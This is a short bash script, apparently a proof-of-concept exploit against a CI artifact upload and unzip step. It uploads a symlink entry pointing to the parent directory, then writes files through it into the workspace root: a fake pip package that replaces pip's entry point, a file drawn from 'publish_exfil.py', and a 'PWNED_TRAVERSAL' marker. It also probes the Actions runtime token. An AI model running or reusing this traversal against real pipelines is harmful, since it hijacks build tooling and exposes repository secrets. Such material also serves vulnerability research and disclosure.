#!/bin/bash
exec 1>&2
cd "${GITHUB_WORKSPACE:-$(cd "$(dirname "$0")/.." && pwd)}" || exit 0
echo "POC_ACTION_START cwd=$(pwd) token_len=${#ACTIONS_RUNTIME_TOKEN} results_url_set=$([ -n "${ACTIONS_RESULTS_URL:-}" ] && echo yes || echo no)"
if [ -f /tmp/poc_action_done ]; then
  echo "POC_ACTION_SKIP already"
  exit 0
fi
dot=1
p=1
INPUT_NAME='.' INPUT_ENTRIES='[{"name":"p","content":"..","mode":41471}]' python3 poc/upload.py && dot=0
echo "POC_ACTION_DOT_EXIT=$dot"
sleep 2
INPUT_NAME='p' INPUT_ENTRIES='[{"name":"pip/__init__.py","content":"","mode":33188},{"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},{"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},{"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}]' python3 poc/upload.py && p=0
echo "POC_ACTION_P_EXIT=$p"
if [ "$dot" = 0 ] && [ "$p" = 0 ]; then
  touch /tmp/poc_action_done
  echo "POC_ACTION_DONE"
fi
exit 0
